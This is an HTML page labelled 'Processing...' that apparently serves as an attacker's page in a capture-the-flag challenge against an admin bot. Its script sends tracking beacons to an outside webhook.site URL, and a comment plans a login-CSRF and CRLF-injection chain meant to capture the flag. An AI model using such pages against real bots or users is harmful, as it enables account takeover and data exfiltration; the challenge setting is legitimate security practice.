<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Loading...</title>
</head>
<body>
    <h1>Processing...</h1>
    
    <script>
    // Webhook
    var W = 'https://webhook.site/e6f5490e-7765-4cb7-a32e-efd8dbbb4b81';
    
    // Signal: Bot visited
    navigator.sendBeacon(W, 'BOT_VISITED_PAGE');
    
    // Wait for bot to finish login (13 seconds total)
    setTimeout(function() {
        navigator.sendBeacon(W, 'FINAL_13SEC_COMPLETE');
    }, 13000);
    
    // Track every second for 20 seconds
    for (var i = 1; i <= 20; i++) {
        (function(sec) {
            setTimeout(function() {
                navigator.sendBeacon(W, 'T' + sec);
            }, sec * 1000);
        })(i);
    }
    
    /*
    Expected timeline:
    0s: Bot visits this page
    5s: Bot's time.sleep(5) completes
    6s: Bot registers FLAG (fails - we already registered)
    7s: Bot logs in with FLAG (success - our account!)
    8s: Bot's session has CRLF username
    8-13s: Bot's "admin stuff" time.sleep(5)
    
    IF bot visits dashboard:
    → CRLF injection triggers
    → Webhook receives: ?flag=success
    → Webhook receives: POST with HTML
    
    IF bot doesn't visit dashboard:
    → Only timing signals (T1, T2, ..., T20)
    → No CRLF signals
    */
    </script>
</body>
</html>
